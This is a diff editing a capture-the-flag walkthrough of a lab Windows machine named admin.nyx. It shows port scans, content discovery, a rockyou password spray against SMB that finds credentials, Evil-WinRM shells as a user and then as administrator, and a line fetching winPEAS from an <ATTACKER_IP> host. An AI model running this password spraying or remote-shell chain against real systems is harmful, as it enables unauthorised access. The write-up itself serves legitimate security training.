@@ -19,7 +19,7 @@ A leaked username in `tasks.txt` is sprayed against SMB with `rockyou.txt`, land
 A full TCP port scan is run first:
 
 ```bash
-sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn admin.nyx
+$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn admin.nyx
 
 PORT      STATE SERVICE      REASON
 80/tcp    open  http         syn-ack ttl 128
@@ -42,7 +42,7 @@ MAC Address: 08:00:27:5C:74:31 (Oracle VirtualBox virtual NIC)
 A version/script scan against the open ports fills in the details — a typical Windows spread, with SMB, WinRM (5985), and a web server on 80:
 
 ```bash
-sudo nmap -p 80,135,139,445,5040,5985,47001,49664,49665,49666,49667,49668,49669,49670 -sCV admin.nyx
+$ sudo nmap -p 80,135,139,445,5040,5985,47001,49664,49665,49666,49667,49668,49669,49670 -sCV admin.nyx
 
 PORT      STATE SERVICE      VERSION
 80/tcp    open  http         Microsoft IIS httpd 10.0
@@ -73,10 +73,10 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 Host script results:
 |_nbstat: NetBIOS name: ADMIN, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:5c:74:31 (Oracle
  VirtualBox virtual NIC)
-| smb2-security-mode: 
-|   3.1.1: 
+| smb2-security-mode:
+|   3.1.1:
 |_    Message signing enabled but not required
-| smb2-time: 
+| smb2-time:
 |   date: 2026-06-03T13:29:03
 |_  start_date: N/A
 ```
@@ -84,14 +84,14 @@ Host script results:
 ### SMB Enumeration
 
 ```bash
-nxc smb admin.nyx
-SMB         10.0.2.20       445    ADMIN            [*] Windows 10 / Server 2019 Build 19041 x64 (name:ADMIN) (domain:ADMIN) (signing:False) (SMBv1:None)
+$ nxc smb admin.nyx
+SMB         admin.nyx       445    ADMIN            [*] Windows 10 / Server 2019 Build 19041 x64 (name:ADMIN) (domain:ADMIN) (signing:False) (SMBv1:None)
 ```
 ```bash
-nxc smb admin.nyx -u '' -p '' --shares
-SMB         10.0.2.20       445    ADMIN            [*] Windows 10 / Server 2019 Build 19041 x64 (name:ADMIN) (domain:ADMIN) (signing:False) (SMBv1:None)
-SMB         10.0.2.20       445    ADMIN            [-] ADMIN\: STATUS_ACCESS_DENIED
-SMB         10.0.2.20       445    ADMIN            [-] Error enumerating shares: Error occurs while reading from remote(104)
+$ nxc smb admin.nyx -u '' -p '' --shares
+SMB         admin.nyx       445    ADMIN            [*] Windows 10 / Server 2019 Build 19041 x64 (name:ADMIN) (domain:ADMIN) (signing:False) (SMBv1:None)
+SMB         admin.nyx       445    ADMIN            [-] ADMIN\: STATUS_ACCESS_DENIED
+SMB         admin.nyx       445    ADMIN            [-] Error enumerating shares: Error occurs while reading from remote(104)
 ```
 
 The null-session attempt confirms the box's hostname and workgroup (both `ADMIN`) but goes no further — share enumeration comes back with `STATUS_ACCESS_DENIED`, so no shares are listed this way.
@@ -106,7 +106,7 @@ http://admin.nyx
 A content discovery scan turns up a text file:
 
 ```bash
-ffuf -u http://admin.nyx/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -i
+$ ffuf -u http://admin.nyx/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -i
 
 tasks.txt            [Status: 200, Size: 98, Words: 17, Lines: 9, Duration: 29ms]
 Tasks.txt            [Status: 200, Size: 98, Words: 17, Lines: 9, Duration: 39ms]
@@ -116,8 +116,6 @@ TASKS.txt            [Status: 200, Size: 98, Words: 17, Lines: 9, Duration: 23ms
 ```
 http://admin.nyx/tasks.txt
 ```
-<img src="../Images/admin/Pasted image 20260603230741.png"/>
-
 ```plaintext
 Pending tasks:
 
@@ -137,30 +135,29 @@ By hope
 With a username in hand, `rockyou.txt` is sprayed against SMB. The wordlist is converted to UTF-8 first, since its default encoding can trip up some tools' password comparisons:
 
 ```bash
-iconv -f ISO-8859-1 -t UTF-8 /usr/share/wordlists/rockyou.txt -o rockyou-utf8.txt
-nxc smb admin.nyx -u hope -p rockyou-utf8.txt
-SMB         10.0.2.20       445    ADMIN            [-] ADMIN\hope:jamie STATUS_LOGON_FAILURE 
-SMB         10.0.2.20       445    ADMIN            [-] ADMIN\hope:santos STATUS_LOGON_FAILURE 
-SMB         10.0.2.20       445    ADMIN            [-] ADMIN\hope:abcdefg STATUS_LOGON_FAILURE 
-SMB         10.0.2.20       445    ADMIN            [-] ADMIN\hope:joanne STATUS_LOGON_FAILURE 
-SMB         10.0.2.20       445    ADMIN            [-] ADMIN\hope:candy STATUS_LOGON_FAILURE 
-SMB         10.0.2.20       445    ADMIN            [-] ADMIN\hope:fuckyou2 STATUS_LOGON_FAILURE 
-SMB         10.0.2.20       445    ADMIN            [+] ADMIN\hope:loser
+$ iconv -f ISO-8859-1 -t UTF-8 /usr/share/wordlists/rockyou.txt -o rockyou-utf8.txt
+$ nxc smb admin.nyx -u hope -p rockyou-utf8.txt
+SMB         admin.nyx       445    ADMIN            [-] ADMIN\hope:jamie STATUS_LOGON_FAILURE
+SMB         admin.nyx       445    ADMIN            [-] ADMIN\hope:santos STATUS_LOGON_FAILURE
+SMB         admin.nyx       445    ADMIN            [-] ADMIN\hope:abcdefg STATUS_LOGON_FAILURE
+SMB         admin.nyx       445    ADMIN            [-] ADMIN\hope:joanne STATUS_LOGON_FAILURE
+SMB         admin.nyx       445    ADMIN            [-] ADMIN\hope:candy STATUS_LOGON_FAILURE
+SMB         admin.nyx       445    ADMIN            [-] ADMIN\hope:fuckyou2 STATUS_LOGON_FAILURE
+SMB         admin.nyx       445    ADMIN            [+] ADMIN\hope:loser
 ```
 > **Credentials:** `hope:loser`
 
 ```bash
-nxc smb admin.nyx -u 'hope' -p 'loser' -x 'id'
 ┌──(kali㉿kali)-[~]
 └─$ nxc smb admin.nyx -u 'hope' -p 'loser' -x 'id'
-SMB         10.0.2.20       445    ADMIN            [*] Windows 10 / Server 2019 Build 19041 x64 (name:ADMIN) (domain:ADMIN) (signing:False) (SMBv1:None)
-SMB         10.0.2.20       445    ADMIN            [+] ADMIN\hope:loser
+SMB         admin.nyx       445    ADMIN            [*] Windows 10 / Server 2019 Build 19041 x64 (name:ADMIN) (domain:ADMIN) (signing:False) (SMBv1:None)
+SMB         admin.nyx       445    ADMIN            [+] ADMIN\hope:loser
 ```
 
 ### Shell as hope
 
 ```bash
-evil-winrm -i admin.nyx -u hope -p loser
+$ evil-winrm -i admin.nyx -u hope -p loser
 
 Evil-WinRM shell v3.9
 
@@ -179,7 +176,7 @@ admin\hope
 *Evil-WinRM* PS C:\Users\hope\Documents> dir C:\Users\hope\Desktop
 
 
-    Directorio: C:\Users\hope\Desktop
+    Directory: C:\Users\hope\Desktop
 
 
 Mode                 LastWriteTime         Length Name
@@ -200,8 +197,9 @@ aacd4aebb5743ba45d3b4591ac03ace1
 `winPEAS` is pulled down and run to automate the usual privilege escalation checks:
 
 ```powershell
-Invoke-WebRequest -Uri http://10.0.2.15:8000/winPEASany.exe -OutFile C:\Users\hope\Desktop\winPEASany.exe
-.\winPEASany.exe
+*Evil-WinRM* PS C:\Users\hope\Documents> Invoke-WebRequest -Uri http://<ATTACKER_IP>:8000/winPEASany.exe -OutFile C:\Users\hope\Desktop\winPEASany.exe
+*Evil-WinRM* PS C:\Users\hope\Documents> cd C:\Users\hope\Desktop
+*Evil-WinRM* PS C:\Users\hope\Desktop> .\winPEASany.exe
 ```
 
 <img src="../Images/admin/Pasted image 20260603231130.png"/>
@@ -217,7 +215,7 @@ Set-LocalUser -Name "administrator" -Password (ConvertTo-SecureString "SuperAdmi
 > **Credentials:** `administrator:SuperAdministrator123`
 
 ```bash
-evil-winrm -i admin.nyx -u 'Administrator' -p 'SuperAdministrator123'
+$ evil-winrm -i admin.nyx -u 'Administrator' -p 'SuperAdministrator123'
 
 Evil-WinRM shell v3.9
 
@@ -236,7 +234,7 @@ admin\administrator
 *Evil-WinRM* PS C:\Users\administrator\Documents> dir C:\Users\administrator\Desktop
 
 
-    Directorio: C:\Users\administrator\Desktop
+    Directory: C:\Users\administrator\Desktop
 
 
 Mode                 LastWriteTime         Length Name
